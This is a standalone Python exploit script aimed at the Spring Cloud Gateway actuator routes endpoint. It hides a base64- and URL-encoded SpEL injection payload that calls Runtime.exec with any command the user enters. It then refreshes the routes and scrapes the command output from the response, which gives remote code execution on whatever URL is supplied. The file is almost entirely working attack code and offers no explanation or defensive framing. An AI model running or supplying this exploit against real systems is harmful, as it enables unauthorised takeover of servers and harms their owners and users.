import requests
import json
import base64
import re

payload1 = '/actuator/gateway/routes/testRoutes'
payload2 = '/actuator/gateway/refresh'
payload3 = '/actuator/gateway/routes/testRoutes'
headers = {
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'en',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Connection': 'close',
    'Content-Type': 'application/json'
}

data = 'JTdCJTBBJTIwJTIwJTIyaWQlMjIlM0ElMjAlMjJ0ZXN0Um91dGVzJTIyJTJDJTBBJTIwJTIwJTIyZmlsdGVycyUyMiUzQSUyMCU1QiU3QiUwQSUyMCUyMCUyMCUyMCUyMm5hbWUlMjIlM0ElMjAlMjJBZGRSZXNwb25zZUhlYWRlciUyMiUyQyUwQSUyMCUyMCUyMCUyMCUyMmFyZ3MlMjIlM0ElMjAlN0IlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjJuYW1lJTIyJTNBJTIwJTIyUmVzdWx0JTIyJTJDJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIydmFsdWUlMjIlM0ElMjAlMjIlMjMlN0JuZXclMjBTdHJpbmclMjhUJTI4b3JnLnNwcmluZ2ZyYW1ld29yay51dGlsLlN0cmVhbVV0aWxzJTI5LmNvcHlUb0J5dGVBcnJheSUyOFQlMjhqYXZhLmxhbmcuUnVudGltZSUyOS5nZXRSdW50aW1lJTI4JTI5LmV4ZWMlMjhuZXclMjBTdHJpbmclNUIlNUQlN0IlNUMlMjJDbWQlNUMlMjIlN0QlMjkuZ2V0SW5wdXRTdHJlYW0lMjglMjklMjklMjklN0QlMjIlMEElMjAlMjAlMjAlMjAlN0QlMEElMjAlMjAlN0QlNUQlMkMlMEElMjAlMjAlMjJ1cmklMjIlM0ElMjAlMjJodHRwJTNBLy9leGFtcGxlLmNvbSUyMiUwQSU3RA=='

data1 = {
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '0'
}

def exec():
    requests.post(url+payload1,headers=headers,data=base64.b64decode(data).decode().replace('Cmd',cmd),verify=False,timeout=5)
    requests.post(url+payload2,headers=headers,data=data1,verify=False,timeout=5)
    a = requests.get(url+payload3,headers=headers,verify=False,timeout=5).text
    exec = re.findall(r'Result = [\'"]?([^\'" )]+)', a)
    print(exec)

if __name__ == '__main__':
    url = input("Url:")
    cmd = input("Cmd:")
    exec()